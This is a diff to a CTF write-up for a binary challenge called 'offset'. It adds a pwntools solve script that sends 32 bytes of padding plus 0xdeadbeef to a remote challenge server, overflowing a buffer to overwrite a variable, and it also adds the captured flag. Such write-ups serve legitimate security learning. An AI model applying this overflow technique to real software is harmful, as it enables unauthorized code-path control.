@@ -97,8 +97,29 @@ Cool it's `0x38 - 0x18 = 32`
 
 So we just need 32 bytes then pass `0xdeadbeef` (packed in endianess) to overwrite the variable to that
 
-Here's my solve script: [link]()
+Here's my solve script: [link](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/ecowas23/final/offset/solve.py)
 
+```python
+from pwn import *
+
+# io = process('./offset')
+io = remote('0.cloud.chals.io', 19052) 
+context.log_level = 'debug'
+
+offset = 32
+overwrite = p64(0xdeadbeef)
+payload = b'A'*offset + overwrite
+io.sendline(payload)
+
+io.interactive()
+```
+
+Running it works
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2ae72425-3122-4786-ac8a-e432c18eeeba)
+
+```
+Flag: flag{m4th_i5_imp0rtan7_8ut_n0t_r3ally}
+```
 
 
 This CTF was an interesting one and I meet tons of cool people there 
